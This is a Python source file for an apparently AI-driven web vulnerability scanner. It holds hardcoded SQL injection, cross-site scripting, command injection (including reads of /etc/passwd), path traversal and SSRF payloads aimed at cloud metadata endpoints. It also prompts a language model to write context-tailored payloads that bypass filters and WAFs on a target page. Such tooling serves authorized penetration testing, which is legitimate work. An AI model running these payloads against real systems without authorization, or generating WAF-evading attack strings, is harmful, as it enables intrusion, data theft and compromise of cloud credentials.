"""AI-powered payload generator using Groq API."""

import logging
from typing import List, Dict, Any, Optional
from agent.llm.groq_client import get_groq_client

logger = logging.getLogger(__name__)


class AIPayloadGenerator:
    """Generate intelligent vulnerability testing payloads using AI."""

    def __init__(self):
        """Initialize AI payload generator."""
        self.llm_client = get_groq_client()

    def generate_sql_injection_payloads(
        self,
        parameter: str,
        context: Optional[str] = None
    ) -> List[str]:
        """Generate SQL injection payloads.

        Args:
            parameter: Parameter name being tested
            context: Additional context (page content, etc.)

        Returns:
            List of payloads to test
        """
        base_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR EXISTS(SELECT * FROM users)--",
        ]

        # If AI is available, generate context-aware payloads
        if context and len(context) < 2000:
            try:
                ai_payloads = self._generate_ai_payloads(
                    vuln_type="SQL Injection",
                    parameter=parameter,
                    context=context[:500]
                )
                return base_payloads + ai_payloads
            except Exception as e:
                logger.warning(f"AI payload generation failed: {e}")

        return base_payloads

    def generate_xss_payloads(
        self,
        parameter: str,
        context: Optional[str] = None
    ) -> List[str]:
        """Generate XSS payloads.

        Args:
            parameter: Parameter name being tested
            context: Additional context

        Returns:
            List of payloads
        """
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "'\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]

        if context and len(context) < 2000:
            try:
                ai_payloads = self._generate_ai_payloads(
                    vuln_type="Cross-Site Scripting (XSS)",
                    parameter=parameter,
                    context=context[:500]
                )
                return base_payloads + ai_payloads
            except Exception as e:
                logger.warning(f"AI payload generation failed: {e}")

        return base_payloads

    def generate_command_injection_payloads(
        self,
        parameter: str
    ) -> List[str]:
        """Generate command injection payloads.

        Args:
            parameter: Parameter name

        Returns:
            List of payloads
        """
        return [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; whoami",
            "| whoami",
            "&& whoami",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
        ]

    def generate_lfi_payloads(self) -> List[str]:
        """Generate Local File Inclusion payloads.

        Returns:
            List of payloads
        """
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "../../../../../../etc/passwd",
            "file:///etc/passwd",
        ]

    def generate_ssrf_payloads(self, base_url: str) -> List[str]:
        """Generate SSRF payloads.

        Args:
            base_url: Base URL for testing

        Returns:
            List of payloads
        """
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::1]",
            "http://2130706433",  # 127.0.0.1 in decimal
        ]

    def _generate_ai_payloads(
        self,
        vuln_type: str,
        parameter: str,
        context: str,
        max_payloads: int = 5
    ) -> List[str]:
        """Generate context-aware payloads using AI.

        Args:
            vuln_type: Type of vulnerability
            parameter: Parameter name
            context: Page context
            max_payloads: Maximum number of payloads to generate

        Returns:
            List of AI-generated payloads
        """
        prompt = f"""You are a penetration testing expert. Generate {max_payloads} advanced and context-aware {vuln_type} payloads for testing the parameter '{parameter}'.

Context from the target page:
{context}

Generate payloads that:
1. Are tailored to the context above
2. Bypass common filters and WAFs
3. Test different injection points and encoding techniques
4. Are practical and likely to work

Return ONLY the payloads, one per line, without explanations or numbering."""

        try:
            response = self.llm_client.generate(
                prompt=prompt,
                max_tokens=500,
                temperature=0.7
            )

            # Parse response to extract payloads
            payloads = [
                line.strip()
                for line in response.strip().split('\n')
                if line.strip() and not line.strip().startswith('#')
            ]

            return payloads[:max_payloads]

        except Exception as e:
            logger.error(f"AI payload generation error: {e}")
            return []

    def generate_payloads_for_type(
        self,
        vuln_type: str,
        parameter: str = "",
        context: Optional[str] = None
    ) -> List[str]:
        """Generate payloads for a specific vulnerability type.

        Args:
            vuln_type: Vulnerability type
            parameter: Parameter name
            context: Additional context

        Returns:
            List of payloads
        """
        vuln_type_lower = vuln_type.lower()

        if "sql" in vuln_type_lower:
            return self.generate_sql_injection_payloads(parameter, context)
        elif "xss" in vuln_type_lower:
            return self.generate_xss_payloads(parameter, context)
        elif "command" in vuln_type_lower:
            return self.generate_command_injection_payloads(parameter)
        elif "lfi" in vuln_type_lower or "file" in vuln_type_lower:
            return self.generate_lfi_payloads()
        elif "ssrf" in vuln_type_lower:
            return self.generate_ssrf_payloads("")
        else:
            return []
